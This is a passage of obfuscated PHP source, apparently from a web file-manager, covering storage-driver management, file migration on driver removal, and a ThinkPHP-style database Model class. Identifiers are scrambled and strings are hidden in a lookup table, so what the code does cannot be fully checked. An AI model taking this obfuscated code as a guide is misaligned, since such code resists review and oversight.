show_json($éÃÏÕã›, !1); } public function driverListSystem() { $Ãè›‘šù =& $_SERVER[§Êá¸İ]; $ñ¥‰—éù = parent::listData(); $–Ìı¥î = array(); foreach ($ñ¥‰—éù as $³ĞÅ–¨ğ) { unset($³ĞÅ–¨ğ[$Ãè›‘šù[231]], $³ĞÅ–¨ğ[$Ãè›‘šù[88]]); $³ĞÅ–¨ğ[$Ãè›‘šù[6]] = json_decode($³ĞÅ–¨ğ[$Ãè›‘šù[6]], !0); $–Ìı¥î[] = $³ĞÅ–¨ğ; } return $–Ìı¥î; } public function defaultDriver() { $ØÙÀÏò =& $_SERVER[§Êá¸İ]; $¢¸¡Ó = parent::listData(); $Ä™ú’à² = array_filter_by_field($¢¸¡Ó, $ØÙÀÏò[37], 1); $Ä™ú’à² = $Ä™ú’à²[0]; if ($Ä™ú’à²) { $Ä™ú’à²[$ØÙÀÏò[6]] = json_decode($Ä™ú’à²[$ØÙÀÏò[6]], !0); } return $Ä™ú’à²; } public function driverInfo($’É…ÂÖ™) { $í¡¹İÓ§ =& $_SERVER[§Êá¸İ]; $ì¹èë«â = array_to_keyvalue(parent::listData(), $í¡¹İÓ§[483]); if (!isset($ì¹èë«â[$’É…ÂÖ™])) { return !1; } $™ê­ÊÌş = $ì¹èë«â[$’É…ÂÖ™]; $™ê­ÊÌş[$í¡¹İÓ§[6]] = json_decode($™ê­ÊÌş[$í¡¹İÓ§[6]], !0); return $™ê­ÊÌş; } public function remove($…Õµ¥»²) { $this->removeShareItems($…Õµ¥»²); return parent::remove($…Õµ¥»²); } public function removeWithFile($°§èæƒ­, $ú‰¥ÖÑ, $”±£­«, $·±Ëº¬© = false) { $¦é«×ãâ =& $_SERVER[§Êá¸İ]; $ôŠ¼«Ò = array($¦é«×ãâ[904] => $°§èæƒ­); $Æ‹¾îüÒ = Model($¦é«×ãâ[552])->where($ôŠ¼«Ò)->count(); $ÖéÛÇ¬ = Model($¦é«×ãâ[552])->where($ôŠ¼«Ò)->sum($¦é«×ãâ[79]); $øŠŒµòµ = $ú‰¥ÖÑ . $¦é«×ãâ[2323] . $°§èæƒ­; $ğûú–˜¨ = LNG($ú‰¥ÖÑ == $¦é«×ãâ[628] ? $¦é«×ãâ[2324] : $¦é«×ãâ[2325]); $„ŞÌ§« = new TaskFileTransfer($øŠŒµòµ, $¦é«×ãâ[215], $Æ‹¾îüÒ, $ğûú–˜¨ . $¦é«×ãâ[462] . $”±£­«[$¦é«×ãâ[32]] . $¦é«×ãâ[214] . $°§èæƒ­); $„ŞÌ§«->task[$¦é«×ãâ[850]] = (double) $ÖéÛÇ¬; $şü­õø = KodIO::defaultDriver(); $„²¾—Ò± = $şü­õø[$¦é«×ãâ[483]]; $±áàÕÇÅ = $°»ì÷µº = $´Å’ø™ = array(); $Å¾Á«¦æ = Model($¦é«×ãâ[230])->where($ôŠ¼«Ò)->field($¦é«×ãâ[2326])->select(); foreach ($Å¾Á«¦æ as $ÕâûİÂ) { $ÔŒÔóÊ = $ÕâûİÂ[$¦é«×ãâ[549]]; if ($·±Ëº¬©) { $°»ì÷µº[] = $ÔŒÔóÊ; continue; } $•Ô¡›”† = $ÕâûİÂ[$¦é«×ãâ[87]]; $ƒ¶Êèãˆ = get_path_father($•Ô¡›”†); $´Å’ø™[] = $ƒ¶Êèãˆ; $ƒ¶Êèãˆ = str_replace("\173\x69\x6f\x3a{$°§èæƒ­}\175\x2f", "\x7b\151\x6f\72{$„²¾—Ò±}\175\57", $ƒ¶Êèãˆ); if (!IO::exist($•Ô¡›”†)) { $±áàÕÇÅ[] = $ÔŒÔóÊ; $„ŞÌ§«->updateFileEnd($ÕâûİÂ[$¦é«×ãâ[32]], $ÕâûİÂ[$¦é«×ãâ[79]]); write_log($¦é«×ãâ[2327] . $•Ô¡›”†, $¦é«×ãâ[1909]); continue; } $¶Á¥š»Ü = IO::move($•Ô¡›”†, $ƒ¶Êèãˆ, REPEAT_RENAME); if (!$¶Á¥š»Ü) { $°»ì÷µº[] = $ÔŒÔóÊ; $„ŞÌ§«->updateFileEnd($ÕâûİÂ[$¦é«×ãâ[32]], $ÕâûİÂ[$¦é«×ãâ[79]]); write_log($¦é«×ãâ[2328] . $•Ô¡›”†, $¦é«×ãâ[1909]); continue; } $ôŠ¼«Ò = array($¦é«×ãâ[549] => $ÔŒÔóÊ); $ŒÑ’ÕğÂ = array($¦é«×ãâ[904] => $„²¾—Ò±, $¦é«×ãâ[87] => $¶Á¥š»Ü); Model($¦é«×ãâ[230])->where($ôŠ¼«Ò)->save($ŒÑ’ÕğÂ); } $üØİÊ­‰ = $„ŞÌ§«->task; if (!$·±Ëº¬©) { Cache::set($øŠŒµòµ, $üØİÊ­‰); } $„ŞÌ§«->end(); $±áàÕÇÅ = array_unique($±áàÕÇÅ); $°»ì÷µº = array_unique($°»ì÷µº); if (!$·±Ëº¬© && ($±áàÕÇÅ || $°»ì÷µº)) { $„ü†Ûû = array(); if ($±áàÕÇÅ) { $„ü†Ûû[] = sprintf(LNG($¦é«×ãâ[2329]), count($±áàÕÇÅ)); } if ($°»ì÷µº) { $„ü†Ûû[] = sprintf(LNG($¦é«×ãâ[2330]), count($°»ì÷µº)); } $„ü†Ûû = sprintf(LNG($¦é«×ãâ[2331]), implode($¦é«×ãâ[2332], $„ü†Ûû)) . $¦é«×ãâ[2333] . date($¦é«×ãâ[2334]) . $¦é«×ãâ[2335]; if ($ú‰¥ÖÑ == $¦é«×ãâ[1946]) { $„ü†Ûû .= $¦é«×ãâ[2336] . LNG($¦é«×ãâ[2337]); } $üØİÊ­‰[$¦é«×ãâ[1274]] = $„ü†Ûû; Cache::set($øŠŒµòµ, $üØİÊ­‰); unset($”±£­«[$¦é«×ãâ[6]]); $§ùÌ’†Û = array($¦é«×ãâ[483] => $°§èæƒ­, $¦é«×ãâ[2216] => $¦é«×ãâ[628], $¦é«×ãâ[32] => $”±£­«[$¦é«×ãâ[32]], $¦é«×ãâ[1297] => $”±£­«); Hook::trigger($¦é«×ãâ[1790], array($¦é«×ãâ[1297] => $§ùÌ’†Û, $¦é«×ãâ[1307] => !0)); show_json($„ü†Ûû, !1, 100111); } if ($ú‰¥ÖÑ == $¦é«×ãâ[628]) { return !0; } if ($±áàÕÇÅ || $°»ì÷µº) { $¦óŠŒÙ¤ = array_merge($±áàÕÇÅ, $°»ì÷µº); $¦óŠŒÙ¤ = array_filter(array_unique($¦óŠŒÙ¤)); $this->removeByFileID($¦óŠŒÙ¤); } if ($´Å’ø™) { $´Å’ø™ = array_filter(array_unique($´Å’ø™)); foreach ($´Å’ø™ as $•Ô¡›”†) { $Àâ¾âì¶ = IO::has($•Ô¡›”†, !0); if (!$Àâ¾âì¶[$¦é«×ãâ[239]] && !$Àâ¾âì¶[$¦é«×ãâ[240]]) { IO::remove($•Ô¡›”†); } } } return $this->remove($°§èæƒ­); } private function removeByFileID($æˆ»‹É = array()) { $ÍàŒìŒ– =& $_SERVER[§Êá¸İ]; if (empty($æˆ»‹É)) { return; } $ÎÃİë· = array($ÍàŒìŒ–[549] => array($ÍàŒìŒ–[7], $æˆ»‹É)); $ŸéìğÁ = Model($ÍàŒìŒ–[1428])->where($ÎÃİë·)->field($ÍàŒìŒ–[193])->select(); if (!$ŸéìğÁ) { return Model($ÍàŒìŒ–[552])->remove($æˆ»‹É); } $ŸéìğÁ = array_to_keyvalue($ŸéìğÁ, $ÍàŒìŒ–[12], $ÍàŒìŒ–[193]); foreach ($ŸéìğÁ as $¥ö‰ûÉ—) { Model($ÍàŒìŒ–[911])->removeNow($¥ö‰ûÉ—, !1); } } private function removeShareItems($¹Û‘·®ã) { $Äíá²ŸÈ =& $_SERVER[§Êá¸İ]; $ù›ôË‰ = "\x7b\x69\157\x3a{$¹Û‘·®ã}\x7d\x2f"; $Ü›”÷¤ = array($Äíá²ŸÈ[193] => 0, $Äíá²ŸÈ[1267] => array($Äíá²ŸÈ[459], "{$ù›ôË‰}\45")); $±®åúºû = Model($Äíá²ŸÈ[1957])->where($Ü›”÷¤)->field($Äíá²ŸÈ[673])->select(); if (empty($±®åúºû)) { return; } $Úèñ›œ¤ = array_to_keyvalue($±®åúºû, $Äíá²ŸÈ[12], $Äíá²ŸÈ[673]); Model($Äíá²ŸÈ[672])->remove($Úèñ›œ¤); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\114\x69\147\x68\164\101\x70\160"; public $modelType = "\123\x79\163\x74\145\x6d\x4f\x70\164\151\157\x6e"; public $field = array("\x6e\x61\x6d\145", "\147\162\157\x75\x70", "\x64\x65\x73\x63", "\143\x6f\x6e\x74\x65\156\x74"); public function listData($„©£ªø¤ = false, $‡â”éÏ = "\x6d\x6f\x64\x69\x66\x79\x54\x69\x6d\x65", $¾Æ›¸ìì = true) { return parent::listData($„©£ªø¤, $‡â”éÏ, $¾Æ›¸ìì); } public function remove($ı®ÙÂ´ø) { $âËÃİØÎ = $this->findByName($ı®ÙÂ´ø); if (!$âËÃİØÎ) { return !1; } return parent::remove($âËÃİØÎ[$_SERVER[§Êá¸İ][483]]); } public function add($åÉó´«) { if ($this->findByName($åÉó´«[$_SERVER[§Êá¸İ][32]])) { return !1; } return parent::insert($åÉó´«); } public function update($ÒıÉËª, $«Ÿô›‹¥) { $Äü¿Ê÷ø =& $_SERVER[§Êá¸İ]; $å×Ä úï = $this->findByName($ÒıÉËª); $«²ó€Œ = $this->findByName($«Ÿô›‹¥[$Äü¿Ê÷ø[32]]); if (!$å×Ä úï || $«²ó€Œ && $«²ó€Œ[$Äü¿Ê÷ø[483]] != $å×Ä úï[$Äü¿Ê÷ø[483]]) { return !1; } return parent::update($å×Ä úï[$Äü¿Ê÷ø[483]], $«Ÿô›‹¥); } } goto a£¼¢ƒ¾çğ; A‹½â¯ó–µ: define($_SERVER[§Êá¸İ][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\145", "\157\162\144\145\162", "\x61\x6c\151\141\x73", "\150\x61\x76\151\156\147", "\x67\162\x6f\165\x70", "\x6c\157\143\x6b", "\144\151\x73\164\151\x6e\143\x74", "\141\x75\x74\x6f", "\x66\x69\154\x74\145\162", "\166\x61\154\x69\x64\141\164\145", "\162\145\163\165\154\164", "\142\151\156\144", "\164\157\153\145\x6e"); public function __construct($Ç¯Ô‰¯— = '', $Ö¬ù€È = '', $ªÁ½Õ— = '') { $û×²šé =& $_SERVER[§Êá¸İ]; $this->_initialize(); if (!empty($Ç¯Ô‰¯—)) { if (strpos($Ç¯Ô‰¯—, $û×²šé[10])) { list($this->dbName, $this->name) = explode($û×²šé[10], $Ç¯Ô‰¯—); } else { $this->name = $Ç¯Ô‰¯—; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($Ö¬ù€È)) { $this->tablePrefix = $û×²šé[12]; } elseif ($û×²šé[12] != $Ö¬ù€È) { $this->tablePrefix = $Ö¬ù€È; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($û×²šé[321]); } $this->db(0, empty($this->connection) ? $ªÁ½Õ— : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $×ê‚ÖÒş =& $_SERVER[§Êá¸İ]; if (empty($this->fields)) { if (think_config($×ê‚ÖÒş[322])) { $ê¤˜„¤ = $this->dbName ? $this->dbName : think_config($×ê‚ÖÒş[323]); $¿ªå§òË = think_var_cache($×ê‚ÖÒş[324] . strtolower(get_path_this($ê¤˜„¤) . $×ê‚ÖÒş[10] . $this->name)); if ($¿ªå§òË) { $Ø¨öØâä = think_config($×ê‚ÖÒş[325]); if (empty($Ø¨öØâä) || $¿ªå§òË[$×ê‚ÖÒş[326]] == $Ø¨öØâä) { $this->fields = $¿ªå§òË; return; } } } $this->flush(); } } public function flush() { $Ôƒòİ =& $_SERVER[§Êá¸İ]; $this->db->setModel($this->name); $ê³ôííñ = $this->db->getFields($this->getTableName()); if (!$ê³ôííñ) { return !1; } $this->fields = array_keys($ê³ôííñ); $this->fields[$Ôƒòİ[327]] = !1; foreach ($ê³ôííñ as $øâŸ”¼ => $êôõ–Ç³) { $Œ³Ï¨À[$øâŸ”¼] = $êôõ–Ç³[$Ôƒòİ[33]]; if ($êôõ–Ç³[$Ôƒòİ[39]]) { $this->fields[$Ôƒòİ[328]] = $øâŸ”¼; if ($êôõ–Ç³[$Ôƒòİ[42]]) { $this->fields[$Ôƒòİ[327]] = !0; } } } $this->fields[$Ôƒòİ[329]] = $Œ³Ï¨À; if (think_config($Ôƒòİ[325])) { $this->fields[$Ôƒòİ[326]] = think_config($Ôƒòİ[325]); } if (think_config($Ôƒòİ[322])) { $©Š¹ÓŸí = $this->dbName ? $this->dbName : think_config($Ôƒòİ[323]); think_var_cache($Ôƒòİ[324] . strtolower(get_path_this($©Š¹ÓŸí) . $Ôƒòİ[10] . $this->name), $this->fields); } } public function switchModel($Ş«Ì¬¸, $òÑ²âÎ = array()) { $öˆÙò ç =& $_SERVER[§Êá¸İ]; $İ»ğ‰· = ucwords(strtolower($Ş«Ì¬¸)) . $öˆÙò ç[330]; if (!class_exists($İ»ğ‰·)) { think_exception($İ»ğ‰· . think_lang($öˆÙò ç[331])); } $this->_extModel = new $İ»ğ‰·($this->name); if (!empty($òÑ²âÎ)) { foreach ($òÑ²âÎ as $ƒ°â šè) { $this->_extModel->setProperty($ƒ°â šè, $this->{$ƒ°â šè}); } } return $this->_extModel; } public function __set($±¤³ö“æ, $“ã› ¨‚) { $this->data[$±¤³ö“æ] = $“ã› ¨‚; } public function __get($¡ÌºÔ®ƒ) { return isset($this->data[$¡ÌºÔ®ƒ]) ? $this->data[$¡ÌºÔ®ƒ] : null; } public function __isset($ªÎÏ½°Ò) { return isset($this->data[$ªÎÏ½°Ò]); } public function __unset($±ë­éşş) { unset($this->data[$±ë­éşş]); } public function __call($¬ÇÆÙù·, $¢·Ö‹£«) { $±áºÎ¥£ =& $_SERVER[§Êá¸İ]; if (in_array(strtolower($¬ÇÆÙù·), $this->methods, !0)) { $this->options[strtolower($¬ÇÆÙù·)] = $¢·Ö‹£«[0]; return $this; } elseif (in_array(strtolower($¬ÇÆÙù·), array($±áºÎ¥£[332], $±áºÎ¥£[333], $±áºÎ¥£[334], $±áºÎ¥£[335], $±áºÎ¥£[336]), !0)) { $Âéë–ô‡ = isset($¢·Ö‹£«[0]) ? $¢·Ö‹£«[0] : $±áºÎ¥£[220]; $Âéë–ô‡ = $this->db->parseKey($Âéë–ô‡); return $this->getField(strtoupper($¬ÇÆÙù·) . $±áºÎ¥£[337] . $Âéë–ô‡ . $±áºÎ¥£[338] . $¬ÇÆÙù·, $±áºÎ¥£[332]); } elseif (strtolower(substr($¬ÇÆÙù·, 0, 5)) == $±áºÎ¥£[339]) { $Âéë–ô‡ = think_parse_name(substr($¬ÇÆÙù·, 5)); $Ëúæ„è¼[$Âéë–ô‡] = $¢·Ö‹£«[0]; return $this->where($Ëúæ„è¼)->find(); } elseif (strtolower(substr($¬ÇÆÙù·, 0, 10)) == $±áºÎ¥£[340]) { $ä–Å«”¢ = think_parse_name(substr($¬ÇÆÙù·, 10)); $Ëúæ„è¼[$ä–Å«”¢] = $¢·Ö‹£«[0]; return $this->where($Ëúæ„è¼)->getField($¢·Ö‹£«[1]); } elseif (isset($this->_scope[$¬ÇÆÙù·])) { return $this->scope($¬ÇÆÙù·, $¢·Ö‹£«[0]); } elseif (method_exists($this, $¬ÇÆÙù·)) { array_unshift($¢·Ö‹£«, $¬ÇÆÙù·); return call_user_func_array(array($this, $±áºÎ¥£[341]), $¢·Ö‹£«); } else { return call_user_func_array(array(parent, $¬ÇÆÙù·), $¢·Ö‹£«); } } protected function call() { $‹á£¤µû =& $_SERVER[§Êá¸İ]; $ÊÛë¸»Â = func_get_args(); $ÊÎÑæú¾ = array_shift($ÊÛë¸»Â); $É¬Ø• = $ÊÎÑæú¾; if (is_array($ÊÎÑæú¾)) { $É¬Ø• = $ÊÎÑæú¾[1]; $ÊÎÑæú¾ = $ÊÎÑæú¾[0]; } $üğŞ§¤¬ = count($ÊÛë¸»Â) - 1; if (isset($ÊÛë¸»Â[$üğŞ§¤¬]) && $ÊÛë¸»Â[$üğŞ§¤¬] === $ÊÎÑæú¾) { think_exception(__CLASS__ . $‹á£¤µû[4] . $ÊÎÑæú¾ . think_lang($‹á£¤µû[342])); return; } $ÊÛë¸»Â[] = $ÊÎÑæú¾; if (method_exists($this, $‹á£¤µû[343])) { $÷¾›âúÖ = call_user_func_array(array($this, $‹á£¤µû[344]), array($É¬Ø•, $ÊÛë¸»Â)); if (!is_null($÷¾›âúÖ) && $÷¾›âúÖ !== !1) { return $÷¾›âúÖ; } } $·æªÅÂ÷ = call_user_func_array(array($this, $ÊÎÑæú¾), $ÊÛë¸»Â); if (method_exists($this, $‹á£¤µû[345])) { $÷¾›âúÖ = call_user_func_array(array($this, $‹á£¤µû[346]), array($É¬Ø•, $ÊÛë¸»Â, $·æªÅÂ÷)); if ($÷¾›âúÖ) { return $÷¾›âúÖ; } } return $·æªÅÂ÷; } protected function _initialize() { } protected function _facade($ğ‘…äıŠ) { $Ø»ƒºÒ­ =& $_SERVER[§Êá¸İ]; if (!empty($this->fields)) { foreach ($ğ‘…äıŠ as $×£»Á²ö => $ì¹Â„µÔ) { if (is_array($this->fields) && !in_array($×£»Á²ö, $this->fields, !0)) { unset($ğ‘…äıŠ[$×£»Á²ö]); } elseif (is_scalar($ì¹Â„µÔ)) { $this->_parseType($ğ‘…äıŠ, $×£»Á²ö); } } } if (!empty($this->options[$Ø»ƒºÒ­[347]])) { $ğ‘…äıŠ = array_map($this->options[$Ø»ƒºÒ­[347]], $ğ‘…äıŠ); unset($this->options[$Ø»ƒºÒ­[347]]); } $this->_beforeWrite($ğ‘…äıŠ); return $ğ‘…äıŠ; } protected function _beforeWrite(&$Ñàõ¶«) { } public function add($¨Ïæ…ÛÚ = '', $Ëã°ÑÆê = array(), $ñˆâşˆ¾ = false) { if (empty($¨Ïæ…ÛÚ)) { if (!empty($this->data)) { $¨Ïæ…ÛÚ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[§Êá¸İ][348]); return !1; } } $Ëã°ÑÆê = $this->_parseOptions($Ëã°ÑÆê); $¨Ïæ…ÛÚ = $this->_facade($¨Ïæ…ÛÚ); if (!1 === $this->_beforeInsert($¨Ïæ…ÛÚ, $Ëã°ÑÆê)) { return !1; } $É½÷àÔÙ = $this->db->insert($¨Ïæ…ÛÚ, $Ëã°ÑÆê, $ñˆâşˆ¾); if (!1 !== $É½÷àÔÙ) { $•ê±¼œ = $this->getLastInsID(); if ($•ê±¼œ) { $¨Ïæ…ÛÚ[$this->getPk()] = $•ê±¼œ; $this->_after_insert($¨Ïæ…ÛÚ, $Ëã°ÑÆê); return $•ê±¼œ; } $this->_after_insert($¨Ïæ…ÛÚ, $Ëã°ÑÆê); } return $É½÷àÔÙ; } protected function _beforeInsert(&$±Ñ‰¿—ˆ, $”ÄØ™ò) { } protected function _after_insert($Œ«Ò£ª, $Äöåéğ­) { } public function addAll($ñç‡°‘, $‹Ë×Û•š = array(), $Ï‰¿«ùÔ = false) { $Ó®©Ú—Ÿ =& $_SERVER[§Êá¸İ]; if (empty($ñç‡°‘)) { $this->error = think_lang($Ó®©Ú—Ÿ[348]); return !1; } $‹Ë×Û•š = $this->_parseOptions($‹Ë×Û•š); foreach ($ñç‡°‘ as $ÆÁĞûº» => $£ı‚¤ó) { $ñç‡°‘[$ÆÁĞûº»] = $this->_facade($£ı‚¤ó); } if (method_exists($this->db, $Ó®©Ú—Ÿ[349])) { $âöÃ‚£Ö = $this->db->insertAll($ñç‡°‘, $‹Ë×Û•š, $Ï‰¿«ùÔ); } else { $this->startTrans(); foreach ($ñç‡°‘ as $ÆÁĞûº» => $£ı‚¤ó) { $âöÃ‚£Ö = $this->db->insert($£ı‚¤ó, $‹Ë×Û•š, $Ï‰¿«ùÔ); } $this->commit(); } if (!1 !== $âöÃ‚£Ö) { $•’ıç± = $this->getLastInsID(); if ($•’ıç±) { return $•’ıç±; } } return $âöÃ‚£Ö; } public function selectAdd($â¬ÀíÇ² = '', $¡„±Èµ¦ = '', $¦°ì‰ÒÀ = array()) { $ĞÆìøÍ =& $_SERVER[§Êá¸İ]; $¦°ì‰ÒÀ = $this->_parseOptions($¦°ì‰ÒÀ); if (!1 === ($ŠÇç£åÒ = $this->db->selectInsert($â¬ÀíÇ² ? $â¬ÀíÇ² : $¦°ì‰ÒÀ[$ĞÆìøÍ[350]], $¡„±Èµ¦ ? $¡„±Èµ¦ : $this->getTableName(), $¦°ì‰ÒÀ))) { $this->error = think_lang($ĞÆìøÍ[351]); return !1; } else { return $ŠÇç£åÒ; } } public function save($¿¿ù—Å = '', $çö‚Û¥Ä = array()) { $ùş‘õ€• =& $_SERVER[§Êá¸İ]; if (empty($¿¿ù—Å)) { if (!empty($this->data)) { $¿¿ù—Å = $this->data; $this->data = array(); } else { $this->error = think_lang($ùş‘õ€•[348]); return !1; } } $¿¿ù—Å = $this->_facade($¿¿ù—Å); $çö‚Û¥Ä = $this->_parseOptions($çö‚Û¥Ä); $…¿«¥ç² = $this->getPk(); if (!isset($çö‚Û¥Ä[$ùş‘õ€•[352]])) { if (isset($¿¿ù—Å[$…¿«¥ç²])) { $ØÄ—ş“Ã[$…¿«¥ç²] = $¿¿ù—Å[$…¿«¥ç²]; $çö‚Û¥Ä[$ùş‘õ€•[352]] = $ØÄ—ş“Ã; unset($¿¿ù—Å[$…¿«¥ç²]); } else { $this->error = think_lang($ùş‘õ€•[351]); return !1; } } if (is_array($çö‚Û¥Ä[$ùş‘õ€•[352]]) && isset($çö‚Û¥Ä[$ùş‘õ€•[352]][$…¿«¥ç²])) { $¯ ­À·œ = $çö‚Û¥Ä[$ùş‘õ€•[352]][$…¿«¥ç²]; } if (!1 === $this->_beforeUpdate($¿¿ù—Å, $çö‚Û¥Ä)) { return !1; } $Üïƒ²ï– = $this->db->update($¿¿ù—Å, $çö‚Û¥Ä); if (!1 !== $Üïƒ²ï–) { if (isset($¯ ­À·œ)) { $¿¿ù—Å[$…¿«¥ç²] = $¯ ­À·œ; } $this->_afterUpdate($¿¿ù—Å, $çö‚Û¥Ä); } return $Üïƒ²ï–; } protected function _beforeUpdate(&$ûÄé§Æ©, $ÎÑáŒÑ…) { } protected function _afterUpdate($œá€Û¢, $Œí›¿ç) { } public function delete($—©ÉÈ§ï = array()) { $Œœü…¯ë =& $_SERVER[§Êá¸İ]; if (empty($—©ÉÈ§ï) && empty($this->options[$Œœü…¯ë[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ îµÈï­ = $this->getPk(); if (is_numeric($—©ÉÈ§ï) || is_string($—©ÉÈ§ï)) { if (strpos($—©ÉÈ§ï, $Œœü…¯ë[50])) { $öÓí‚[$ îµÈï­] = array($Œœü…¯ë[353], $—©ÉÈ§ï); } else { $öÓí‚[$ îµÈï­] = $—©ÉÈ§ï; } $this->options[$Œœü…¯ë[352]] = $öÓí‚; } $—©ÉÈ§ï = $this->_parseOptions(); if (is_array($—©ÉÈ§ï[$Œœü…¯ë[352]]) && isset($—©ÉÈ§ï[$Œœü…¯ë[352]][$ îµÈï­])) { $ƒµ¿íõ» = $—©ÉÈ§ï[$Œœü…¯ë[352]][$ îµÈï­]; } $çşøû¯ = $this->db->delete($—©ÉÈ§ï); if (!1 !== $çşøû¯) { $äËªåÕÀ = array(); if (isset($ƒµ¿íõ»)) { $äËªåÕÀ[$ îµÈï­] = $ƒµ¿íõ»; } $this->_after_delete($äËªåÕÀ, $—©ÉÈ§ï); } return $çşøû¯; } protected function _after_delete($ÈÑ…•ë‰, $³ë‹¯İ“) { } public function select($Àã¦Á“º = array()) { $Ãç’Ö¢ƒ =& $_SERVER[§Êá¸İ]; if (is_string($Àã¦Á“º) || is_numeric($Àã¦Á“º)) { $ñş“ôëƒ = $this->getPk(); if (strpos($Àã¦Á“º, $Ãç’Ö¢ƒ[50])) { $Óüã««[$ñş“ôëƒ] = array($Ãç’Ö¢ƒ[353], $Àã¦Á“º); } else { $Óüã««[$ñş“ôëƒ] = $Àã¦Á“º; } $this->options[$Ãç’Ö¢ƒ[352]] = $Óüã««; } elseif (!1 === $Àã¦Á“º) { $Àã¦Á“º = $this->_parseOptions(); return $Ãç’Ö¢ƒ[354] . $this->db->buildSelectSql($Àã¦Á“º) . $Ãç’Ö¢ƒ[355]; } $Àã¦Á“º = $this->_parseOptions(); $î¶º’Û¶ = $this->db->select($Àã¦Á“º); if (!1 === $î¶º’Û¶) { return !1; } if (empty($î¶º’Û¶)) { return null; } $this->_afterSelect($î¶º’Û¶, $Àã¦Á“º); return $î¶º’Û¶; } protected function _afterSelect(&$á¯ƒù¼, $“Ç¶••) { } public function buildSql($¦çŒ‡Ï = array()) { $Â˜ôœÃ” =& $_SERVER[§Êá¸İ]; $¦çŒ‡Ï = $this->_parseOptions($¦çŒ‡Ï); return $Â˜ôœÃ”[354] . $this->db->buildSelectSql($¦çŒ‡Ï) . $Â˜ôœÃ”[355]; } public function optionsValue($Œ‚­š± = null) { if (is_null($Œ‚­š±)) { return $this->options; } elseif (is_array($Œ‚­š±)) { $this->options = array_merge($this->options, $Œ‚­š±); } } protected function _parseOptions($ÚÖåì¼¬ = array()) { $¶ÅÂ²¤ =& $_SERVER[§Êá¸İ]; if (is_array($ÚÖåì¼¬)) { $ÚÖåì¼¬ = array_merge($this->options, $ÚÖåì¼¬); } $this->options = array(); if (!isset($ÚÖåì¼¬[$¶ÅÂ²¤[356]])) { $ÚÖåì¼¬[$¶ÅÂ²¤[356]] = $this->getTableName(); $üéŞÆŠ = $this->fields; } else { $üéŞÆŠ = $this->getDbFields(); } if (!empty($ÚÖåì¼¬[$¶ÅÂ²¤[357]])) { $ÚÖåì¼¬[$¶ÅÂ²¤[356]] .= $¶ÅÂ²¤[53] . $ÚÖåì¼¬[$¶ÅÂ²¤[357]]; } $ÚÖåì¼¬[$¶ÅÂ²¤[358]] = $this->name; if (isset($ÚÖåì¼¬[$¶ÅÂ²¤[352]]) && is_array($ÚÖåì¼¬[$¶ÅÂ²¤[352]]) && !empty($üéŞÆŠ) && !isset($ÚÖåì¼¬[$¶ÅÂ²¤[359]]) && !isset($ÚÖåì¼¬[$¶ÅÂ²¤[356]])) { foreach ($ÚÖåì¼¬[$¶ÅÂ²¤[352]] as $ı‰©¯ª => $ç‰Õõ—Û) { $ı‰©¯ª = trim($ı‰©¯ª); if (in_array($ı‰©¯ª, $üéŞÆŠ, !0)) { if (is_scalar($ç‰Õõ—Û)) { $this->_parseType($ÚÖåì¼¬[$¶ÅÂ²¤[352]], $ı‰©¯ª); } } elseif (!is_numeric($ı‰©¯ª) && $¶ÅÂ²¤[11] != substr($ı‰©¯ª, 0, 1) && !1 === strpos($ı‰©¯ª, $¶ÅÂ²¤[10]) && !1 === strpos($ı‰©¯ª, $¶ÅÂ²¤[337]) && !1 === strpos($ı‰©¯ª, $¶ÅÂ²¤[214]) && !1 === strpos($ı‰©¯ª, $¶ÅÂ²¤[360])) { unset($ÚÖåì¼¬[$¶ÅÂ²¤[352]][$ı‰©¯ª]); } } } $this->_options_filter($ÚÖåì¼¬); return $ÚÖåì¼¬; } protected function _options_filter(&$ÖÌéÓ) { } protected function _parseType(&$Ì©ëÑÙÒ, $àËùªÄ) { $²ãşºÆ =& $_SERVER[§Êá¸İ]; if (empty($this->options[$²ãşºÆ[361]][$²ãşºÆ[4] . $àËùªÄ])) { $Ë–ÚÎÊä = strtolower($this->fields[$²ãşºÆ[329]][$àËùªÄ]); if (!1 !== strpos($Ë–ÚÎÊä, $²ãşºÆ[362])) { } elseif (!1 === strpos($Ë–ÚÎÊä, $²ãşºÆ[363]) && !1 !== strpos($Ë–ÚÎÊä, $²ãşºÆ[364])) { $Ì©ëÑÙÒ[$àËùªÄ] = intval($Ì©ëÑÙÒ[$àËùªÄ]); } elseif (!1 !== strpos($Ë–ÚÎÊä, $²ãşºÆ[365]) || !1 !== strpos($Ë–ÚÎÊä, $²ãşºÆ[366])) { $Ì©ëÑÙÒ[$àËùªÄ] = floatval($Ì©ëÑÙÒ[$àËùªÄ]); } elseif (!1 !== strpos($Ë–ÚÎÊä, $²ãşºÆ[367])) { $Ì©ëÑÙÒ[$àËùªÄ] = (bool) $Ì©ëÑÙÒ[$àËùªÄ]; } } } public function find($§ÏÈõ ¦ = array()) { $¸°¡·Æƒ =& $_SERVER[§Êá¸İ]; if (is_numeric($§ÏÈõ ¦) || is_string($§ÏÈõ ¦)) { $±ô“´Ôœ[$this->getPk()] = intval($§ÏÈõ ¦); $this->options[$¸°¡·Æƒ[352]] = $±ô“´Ôœ; } $this->options[$¸°¡·Æƒ[368]] = 1; $§ÏÈõ ¦ = $this->_parseOptions(); $µêê¨ç = $this->db->select($§ÏÈõ ¦); if (!1 === $µêê¨ç) { return !1; } if (empty($µêê¨ç)) { return null; } $this->data = $µêê¨ç[0]; $this->_afterFind($this->data, $§ÏÈõ ¦); if (!empty($this->options[$¸°¡·Æƒ[369]])) { return $this->returnResult($this->data, $this->options[$¸°¡·Æƒ[369]]); } return $this->data; } protected function _afterFind(&$«È·Ôæ•, $İ“¬‡íÙ) { } protected function 